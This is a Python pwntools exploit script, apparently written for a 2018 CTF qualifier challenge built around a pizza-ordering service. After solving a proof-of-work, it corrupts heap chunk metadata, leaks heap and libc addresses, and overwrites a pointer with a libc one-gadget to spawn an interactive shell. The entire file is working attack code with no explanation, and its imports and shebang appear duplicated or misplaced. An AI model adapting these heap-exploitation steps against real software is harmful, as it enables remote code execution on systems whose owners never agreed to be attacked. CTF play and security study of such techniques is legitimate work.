from pwn import *

from pwn import *

#!/usr/bin/env python
import sys
import struct
import hashlib

# inspired by C3CTF's POW
context.log_level = 'debug'
def pow_hash(challenge, solution):
    return hashlib.sha256(challenge.encode('ascii') + struct.pack('<Q', solution)).hexdigest()

def check_pow(challenge, n, solution):
    h = pow_hash(challenge, solution)
    return (int(h, 16) % (2**n)) == 0

def solve_pow(challenge, n):
    candidate = 0
    while True:
        if check_pow(challenge, n, candidate):
            return candidate
        candidate += 1

def go():
  HOST = "83b1db91.quals2018.oooverflow.io"
  PORT = 31337
  REMOTE = 1
  if(REMOTE):
    s = remote(HOST,PORT)
  else:
    s = remote('192.168.33.10',PORT)
  challenge = s.recvuntil('n:')[-3-10:-3]
  n = int(s.recv(3)[1:])

  print('Solving challenge: "{}", n: {}'.format(challenge, n))

  solution = solve_pow(challenge, n)
  print('Solution: {} -> {}'.format(solution, pow_hash(challenge, solution)))
  s.recvuntil('Solution:')
  s.sendline(str(solution))
  return s
s = go()

def new(name):
  s.recvuntil('Choice:')
  s.sendline('N')
  s.recvuntil('?')
  s.sendline(name)
def order_pizza(pizza):
  s.recvuntil('Choice:')
  s.sendline('O')
  s.recvuntil('?')
  s.sendline(str(len(pizza)))
  for incre in pizza:
    s.recvuntil('?')
    s.sendline(str(len(incre)))
    for dat in incre:
      s.recvuntil(':')
      s.sendline(dat)
def leave():
  s.recvuntil('Choice:')
  s.sendline('L')
def cook_pizza(dat):
  s.recvuntil('Choice:')
  s.sendline('C')
  s.recvuntil(':')
  s.sendline(dat)
def login(dat):
  s.recvuntil('Choice:')
  s.sendline("L")
  s.recvuntil('?')
  s.sendline(dat)
new('A'*0x20);leave();
new('BBBB');leave();
new('CCCC');leave();
login('A'*0x20)
order_pizza([["A"*16,"B"*16,"C"*16]])
leave()
login('BBBB')
order_pizza([[p32(0x9ff09ff0),p32(0x80858d8d)]])
cook_pizza("K"*0x37)
s.recvuntil('Choice:')
s.sendline('P')
s.recvuntil(':')
s.sendline('A'*0x38+p64(0x21)+"\x00"*0x18+p64(0x21)+"\x00"*0x18+p64(0x91))
login('A'*0x20)
cook_pizza('1234')
s.recvuntil('Adding ingredient: ')
heap = u64(s.recv(6)+'\x00\x00')
print "heap : "+hex(heap)
leave()
new("1"*0x20);leave();
new('2222');leave();
new('3333');leave();
login('1'*0x20)
order_pizza([["A"*16,"B"*16,"C"*16,"D"*16]])
leave()
login('2222')
order_pizza([[p32(0x9ff09ff0),p32(0x80858d8d)]])
cook_pizza("J"*0x37)
s.recvuntil('Choice:')
s.sendline('P')
s.recvuntil(':')
s.sendline('A'*0x38+p64(0x21)+"\x00"*0x18+p64(0x21)+"\x00"*0x18+p64(0x91)+p64(heap+0xe28)+'\x08')
login("1"*0x20)
cook_pizza('A'*200)
cook_pizza('A'*6)
s.recvuntil('Adding ingredient: ')
libc = u64(s.recv(6)+'\x00\x00') - 0x3c4bf8
print "libc : "+hex(libc)
new('exploit');leave();
new('shell');
order_pizza([[p32(0x9ff09ff0),p32(0x80858d8d)]])
cook_pizza("S"*0x37)
s.recvuntil('Choice:')
s.sendline('P')
s.recvuntil(':')
s.sendline(p64(libc+0xf02a4)+'H'*0x98+p64(heap+0xe70)[:-1])
login('1'*0x20)
s.recvuntil('Choice:')
s.sendline('A')
s.interactive()

